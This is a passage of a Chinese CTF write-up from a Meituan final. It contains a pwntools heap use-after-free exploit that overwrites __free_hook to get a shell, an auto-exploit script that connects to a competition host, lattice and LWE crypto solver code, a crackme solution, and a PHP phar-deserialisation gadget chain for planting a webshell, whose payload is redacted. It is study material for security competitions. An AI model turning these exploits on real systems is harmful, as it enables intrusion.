class="built_in">eval</span>(data))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%x: %s&#x27;</span> %(idx, state.solver.<span class="built_in">eval</span>(data, cast_to=<span class="built_in">bytes</span>)))</span><br><span class="line">            s += state.solver.<span class="built_in">eval</span>(data, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        </span><br><span class="line">    s += (-max_disp + <span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(backdoor_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;back_door = &quot;</span> + <span class="built_in">hex</span>(backdoor_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-max_disp = &quot;</span> + <span class="built_in">hex</span>(-max_disp))</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;39.106.76.68&quot;</span>,<span class="number">44064</span>)</span><br><span class="line">r.sendline(aeg(<span class="string">&quot;./pwn&quot;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="mininep1美团决赛ctfwriteup"><a class="markdownIt-Anchor" href="#mininep1美团决赛ctfwriteup"></a> <strong>Mininep1–美团决赛CTF–Writeup</strong></h1>
<h2 id="一-战队信息"><a class="markdownIt-Anchor" href="#一-战队信息"></a> <strong>一、战队信息</strong></h2>
<p>战队名称：Mininep1-1</p>
<p>个人排名：4</p>
<h2 id="二-解题详情"><a class="markdownIt-Anchor" href="#二-解题详情"></a> <strong>二、解题详情</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/xjNAP_qZrZsv3u0Wrp_gOg-166427030055210.png" alt="10"></p>
<h2 id="三-解题过程"><a class="markdownIt-Anchor" href="#三-解题过程"></a> <strong>三、解题过程</strong></h2>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> <strong>Misc</strong></h2>
<h3 id="what_is_that"><a class="markdownIt-Anchor" href="#what_is_that"></a> <strong>What_is_that</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/hQaXdjeI8kdpDiOkGqIXSg.png" alt="11"></p>
<p>qwq手撸flag：</p>
<p>flag{1f576e5e-a0db-4fe2-8678-5ec4d227d41a}</p>
<h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> <strong>Pwn</strong></h2>
<h3 id="heap"><a class="markdownIt-Anchor" href="#heap"></a> <strong>heap</strong></h3>
<p>就是一个glibc2.27的UAF漏洞，但是申请的堆块大小只能是0x20或0x30，当申请0x20时，edit函数存在溢出修改chunk_size泄露libc即可</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">r</span>=process(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/pwn&quot;)</span><br><span class="line"><span class="comment"># r=remote(&quot;47.95.8.59&quot;,24835)</span></span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/pwn&quot;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/libc.so.6&quot;)</span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;amd64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    <span class="attribute">src</span>=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x127C)</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(r,src)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;What size of paper do you want to add?&quot;</span>,str(size))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want torn up?&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want to write?&quot;</span>,str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;How many words do you need to write?&quot;</span>,str(len(content)))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want to review?&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(0x18)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0x18):</span><br><span class="line">    <span class="built_in">add</span>(0x1f)</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=p64(0)*3+p64(0x421)</span><br><span class="line"><span class="built_in">edit</span>(0,payload)</span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line"><span class="attribute">libc_base</span>=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b<span class="string">&quot;\x00&quot;</span>))-0x10-96-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+hex(libc_base))</span><br><span class="line"><span class="attribute">free_hook</span>=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="attribute">system_addr</span>=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line"><span class="built_in">edit</span>(3,p64(free_hook))</span><br><span class="line"><span class="built_in">add</span>(0x1f)</span><br><span class="line"><span class="built_in">add</span>(0x1f)</span><br><span class="line"><span class="built_in">edit</span>(0x17,p64(system_addr))</span><br><span class="line"><span class="built_in">edit</span>(4,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> <strong>Crypto</strong></h2>
<h3 id="strange_lwe"><a class="markdownIt-Anchor" href="#strange_lwe"></a> <strong>strange_lwe</strong></h3>
<p>LWE问题，用babai’s CVP算法求解。</p>
<p>这里我本来想直接通过误差来进行判断的，然而发现有些位对不上。因此还是绕了个弯先把s给算出来了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Babai&#x27;s Nearest Plane algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -=  M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line">q = <span class="number">401</span></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">a = <span class="number">0.025</span></span><br><span class="line">num = <span class="number">48</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">A=Matrix(ZZ,<span class="built_in">eval</span>(data[<span class="number">0</span>].strip()))</span><br><span class="line">cipher=<span class="built_in">eval</span>(data[<span class="number">1</span>].strip())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment">#t=DiscreteGaussianDistributionIntegerSampler(a*q)</span></span><br><span class="line"><span class="comment">#print([ t() for _ in range(1000)])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">res=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for k in range(num):</span></span><br><span class="line"><span class="string">	rt=cipher[k][0]</span></span><br><span class="line"><span class="string">	Lattice = matrix(ZZ, m + n, m)</span></span><br><span class="line"><span class="string">	for i in range(m):</span></span><br><span class="line"><span class="string">		for j in range(n):</span></span><br><span class="line"><span class="string">			Lattice[m + j, i] = A[i][j]</span></span><br><span class="line"><span class="string">		Lattice[i, i] = q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	lattice = IntegerLattice(Lattice, lll_reduce=True)</span></span><br><span class="line"><span class="string">	print(&quot;LLL done&quot;)</span></span><br><span class="line"><span class="string">	gram = lattice.reduced_basis.gram_schmidt()[0]</span></span><br><span class="line"><span class="string">	target = vector(ZZ,rt)</span></span><br><span class="line"><span class="string">	cv = Babai_closest_vector(lattice.reduced_basis, gram, target)</span></span><br><span class="line"><span class="string">	#print(&quot;Closest Vector: &#123;&#125;&quot;.format(cv))</span></span><br><span class="line"><span class="string">	error=cv-target</span></span><br><span class="line"><span class="string">	print(&quot;Error: &#123;&#125;&quot;.format(error))</span></span><br><span class="line"><span class="string">	if any([abs(e)&gt;40 for e in error]):</span></span><br><span class="line"><span class="string">		res+=&#x27;0&#x27;</span></span><br><span class="line"><span class="string">	else:</span></span><br><span class="line"><span class="string">		res+=&#x27;1&#x27;</span></span><br><span class="line"><span class="string">	print(res)</span></span><br><span class="line"><span class="string">	A = matrix(Zmod(q), A)</span></span><br><span class="line"><span class="string">	try:</span></span><br><span class="line"><span class="string">		s = A.solve_right(cv)</span></span><br><span class="line"><span class="string">		print(&#x27;s: &#123;&#125;&#x27;.format(s))</span></span><br><span class="line"><span class="string">	except:</span></span><br><span class="line"><span class="string">		print(&quot;no solution&quot;)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s=(<span class="number">195</span>, <span class="number">202</span>, <span class="number">322</span>, <span class="number">287</span>, <span class="number">230</span>, <span class="number">311</span>, <span class="number">396</span>, <span class="number">58</span>, <span class="number">242</span>, <span class="number">191</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">248</span>, <span class="number">264</span>, <span class="number">139</span>, <span class="number">291</span>)</span><br><span class="line">s=vector(GF(q),s)</span><br><span class="line">A=Matrix(GF(q),A)</span><br><span class="line"><span class="built_in">print</span>(A*s)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">	tmp=[]</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(num*<span class="number">8</span>):</span><br><span class="line">		c=vector(ZZ,cipher[k][l])</span><br><span class="line">		As=vector(GF(q),A*s)</span><br><span class="line">		t=c-As</span><br><span class="line">		t=[tt <span class="keyword">if</span> tt&lt;(q//<span class="number">2</span>) <span class="keyword">else</span> q-tt <span class="keyword">for</span> tt <span class="keyword">in</span> t]</span><br><span class="line">		tmp.extend(t)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">all</span>([ tt&lt;<span class="number">40</span> <span class="keyword">for</span> tt <span class="keyword">in</span> t]):</span><br><span class="line">		res+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#res=&#x27;000000110110001010100111101100001101011110011110&#x27;</span></span><br><span class="line">my_secret_bits=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,res))</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + sha1(<span class="built_in">str</span>(my_secret_bits).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;7e0fefd15c630d4b41db2ac9e18d48d691b3d419&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <strong>Reverse</strong></h2>
<h3 id="crackme"><a class="markdownIt-Anchor" href="#crackme"></a> <strong>crackme</strong></h3>
<p>题目核心逻辑在digest函数里，首先可以看到这里有个SM4加密:</p>
<p><img src="/2022/09/MT-CTF-Writeup/9JL4IvvtABLoNAquRwetrA.png" alt="13"></p>
<p>接下来最底下有个RC4：</p>
<p><img src="/2022/09/MT-CTF-Writeup/e7Ydd8t3cchsUByy2klzDQ.png" alt="14"></p>
<p>猜测程序是先做SM4加密，最后RC4并转hex输出digest。SM4密钥已给出，而RC4密钥动调可以发现就是LicenseKey。因此用CyberChef在线跑一下解密就出了。</p>
<p><img src="/2022/09/MT-CTF-Writeup/XYLE2NUnBulMjsDqQRqnVA.png" alt="15"></p>
<p>flag{c6545808-81ba-48c6-b082-df559da10751}</p>
<h2 id="web_复现"><a class="markdownIt-Anchor" href="#web_复现"></a> Web_复现</h2>
<h3 id="mako_imagemagick"><a class="markdownIt-Anchor" href="#mako_imagemagick"></a> <strong>Mako_imagemagick:</strong></h3>
<h4 id="赛题复现"><a class="markdownIt-Anchor" href="#赛题复现"></a> 赛题复现：</h4>
<p>自己起了一个docker，我们先大概看一下题目吧。</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>文件上传先简单的传个文件抓个包看一下，</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>这里还没有去看源码，看到这个，就随便上传了一个码试了一下，发现图片上传后被发送到一个函数中处理。这里就意识到不是简单的文件上传了，决赛时也去啃源码了，但是没怎么啃明白，复现时间足够多，在加上Maxzed大师傅的wp总算啃明白了，源码太多，我就截重点来说吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里看Maxzed师傅的wp没看出来他怎么判断存在phar反序列化漏洞，这里自己又去细看了一下源码。</p>
<p>按照phar反序列化的惯例就是要找可控的函数，那就找吧<s>审那么大一个玩意儿确实难受</s></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//每次循环中，当前数组元素的值被赋给 $fileName，当前数组元素的键名也会在每次循环中被赋给变量 $index。并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个数组元素），直到遍历到数组的末尾，停止遍历并退出循环。</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//对每次循环的fileName进行base64编码</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//获取fileName的一个函数，这里是读取imageFile的文件名并赋值给fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//就这个函数，要是敏锐一些，应该就能猜到fileName可控，那么就要找触发点，接着审。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//可控的filename,这里可以用来触发phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里来说一下fileName为啥是可控的,在Image构造函数中存在file_exists()来触发，同时在ediGet中filename进行get访问，即可用来触发phar</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>那么接下来就是挖链子了，</p>
<p>初步审下来，我这里就直接用maxzed的链子了，我就解读一下他为啥会用这个链子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>在Session.php中的__destruct(),具有自动提交会话数据的commit,数据传到File</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在File.write()中存在写入功能点，链子利用的就是这个，接着看下一个功能点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.php中的put()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>功能：把一个字符串写入文件中。</p>
<p>语法：<code>file_put_contents(file,data,mode,context)</code></p>
<p>参数说明：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td>
</tr>
<tr>
<td><em>data</em></td>
<td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定文件句柄的环境。<em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略</td>
</tr>
</tbody>
</table>
<p>参数 <em>data</em> 可以是数组（但不能是多维数组）。</p>
<p>自 PHP 5.1.0 起，<em>data</em> 参数也可以被指定为 stream 资源，stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。</p>
<p>对 <em>context</em> 参数的支持是 PHP 5.0.0 添加的。</p>
<hr>
<p>这里就可以利用将我们想写入的数据写进容器中，理论成立，实践开始，我这里就直接用maxzed的exp啦，将shell写在/var/www/mako/public下。</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//由于要存本地，这个先和谐一下</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace 